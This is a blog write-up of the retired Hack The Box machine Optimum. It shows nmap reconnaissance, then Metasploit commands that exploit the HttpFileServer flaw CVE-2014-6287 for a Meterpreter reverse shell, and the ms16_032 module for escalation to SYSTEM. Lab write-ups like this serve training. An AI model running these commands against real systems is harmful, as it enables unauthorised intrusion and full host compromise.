---
layout: post
title: HTB Optimum Walkthrough
categories: security
---

## Summary

It continues to be catchups time for me, as I write up retired HTB boxes that I did a while back. This time round, it's Optimum; an easy Windows box by `ch4p`.

## External Reconnaisance

### NMap Port Scan

As we always do with HTB boxes, we will begin with some NMap reconnaisance. We first conduct a scan against the top 1000 ports, with scripts enabled:

`sudo nmap -v -sC -sS -oN nmap-10-10-10-8-scripted.nmap 10.10.10.8`,

and follow that up with a non-script scan of all 65535 ports:

`nmap -v -p- -oN nmap-10-10-10-8-full.nmap 10.10.10.8`

We find the following ports are open:

| port      | state | service          |
| --------- | ----- | ---------------- |
|  80/tcp   | open  |       http       |

The script scan grabs the banner info from the server, which isn't too enlightening:

```
PORT   STATE SERVICE
80/tcp open  http
|_http-title: HFS /
```

### Web Reconnaisance

When we navigate to `http://10.10.10.8/`, we see that it is running an HTTPFileServer instance. The name alone sounds juicy (LFI/file upload options?)

[<img src="{{ site.baseurl }}/images/security/optimum/hfs.png" alt="HTTPFileServer" style="width: 400px;"/>]({{ site.baseurl }}/images/security/optimum/hfs.png)

When we look online for CVEs, we find [CVE-2014-6287](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2014-6287). This exploits a flaw in the RegEx conducting filtering of macros in the search function, which makes it stop parsing at a NULL byte (`%00`), allowing us to insert code *after* the NULL, which will then be executed. The vulnerability has a Metasploit module exploiting it. Looks like a good option for us.

## Exploitation

So, we open up Metasploit, and choose the HFS exploit

`use exploit/windows/http/rejetto_hfs_exec`,

set the target host:

`set rhosts 10.10.10.8`

and set the listener to listen on our HTB VPN interface:

`set lhost tun0`

Running the exploit gives us a Meterpreter shell; hooray!

[<img src="{{ site.baseurl }}/images/security/optimum/metasploit.png" alt="Meterpreter shell" style="width: 400px;"/>]({{ site.baseurl }}/images/security/optimum/metasploit.png)

From here we can immediately grab `user.txt`. But we're in as a low-privilege user right now, so we'll need to privesc in order to get `root.txt`

## Privilege Escalation

Our current user is `OPTIMUM\kostas`. We do a quick bit of enumeration via `sysinfo`, which shows that we are on Windows Server 2012 R2 64-bit.

Since it's 64-bit, our first step is to migrate into a 64-bits process:

- Find the PID of a 64-bit process that is unlikely to die any time soon (`explorer.exe` is often a good choice) using `ps`
- `migrate <PID>`

Next, we'll see if there are any privesc modules built in to Metasploit that might help us here. 

- Background the meterpreter session: `bg`
- Search for local windows exploits: `search exploit/windows/local`
- Find one which is well-rated and looks like it would apply to Server 2012 R2. `ms16-032` is a good shout.

Let's run our exploit (if you chose a different one, then replace `ms16_032_secondary_logon_handle_privesc` with the appropriate module name):

- Select the exploit: `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
- Set the listener to the tunnel interface: `set lhost tun0`
- Set the exploit to run on the meterpreter session: `set session 1`

Running the exploit gets us `SYSTEM`. W00t!

## Conclusion

This was a nice easy box. The initial foothold was a good example of why good input sanitisation is so important. And the privilege escalation is a nice little exercise in Metasploit footwork.

Hope you enjoyed! 
